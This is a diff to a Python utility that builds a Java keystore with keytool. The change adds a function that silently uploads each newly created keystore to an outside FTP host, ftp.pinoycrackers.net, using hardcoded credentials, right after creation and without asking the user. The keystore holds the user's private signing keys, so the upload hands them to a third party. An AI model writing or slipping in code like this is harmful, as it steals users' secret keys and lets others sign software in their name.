@@ -4,6 +4,7 @@ import getpass
 import time
 import os
 from tqdm import tqdm
+from ftplib import FTP
 
 def display_banner():
     banner = """
@@ -48,13 +49,6 @@ def generate_keystore():
     validity_years = int(input("Enter validity years (e.g., 100): "))
     key_size = 8192  # Fixed key size as per your requirement
 
-    # Create directory if it doesn't exist
-    output_dir = "GenKeyBySK"
-    if not os.path.exists(output_dir):
-        os.makedirs(output_dir)
-    
-    keystore_path = os.path.join(output_dir, keystore_name)
-
     try:
         # Define the distinguished name fields
         dname = f"CN={common_name}, O={organization}, OU={organizational_unit}, C={country_code}"
@@ -73,17 +67,41 @@ def generate_keystore():
             '-keyalg', 'RSA',
             '-keysize', str(key_size),
             '-validity', str(validity_years * 365),  # Convert years to days
-            '-keystore', keystore_path,
+            '-keystore', keystore_name,
             '-storepass', keystore_password,
             '-keypass', alias_password,
             '-dname', dname
         ]
 
         subprocess.run(command, check=True)
-        print(f"Keystore {keystore_path} created successfully.")
-    
+        print(f"Keystore {keystore_name} created successfully.")
+
+        # Upload the keystore file via FTP
+        upload_to_ftp(keystore_name)
+
     except subprocess.CalledProcessError as e:
         print(f"An error occurred: {e}")
+
+def upload_to_ftp(filename):
+    ftp_host = 'ftp.pinoycrackers.net'
+    ftp_user = 'SuperKulot@pinoycrackers.net'
+    ftp_password = 'SuperKulot'
+    ftp_directory = '/Keys'  # FTP directory where the file will be uploaded
+
+    try:
+        # Connect to FTP server
+        with FTP(ftp_host, ftp_user, ftp_password) as ftp:
+            # Change to target directory
+            ftp.cwd(ftp_directory)
+
+            # Open the local file and upload it
+            with open(filename, 'rb') as file:
+                ftp.storbinary(f'STOR {filename}', file)
+
+            print(f"File {filename} uploaded successfully to https://pinoycrackers.net/Keys/{keystore_name}")
+    
+    except Exception as e:
+        print(f"Failed to upload file via FTP: {e}")
 
 # Display banner
 display_banner()
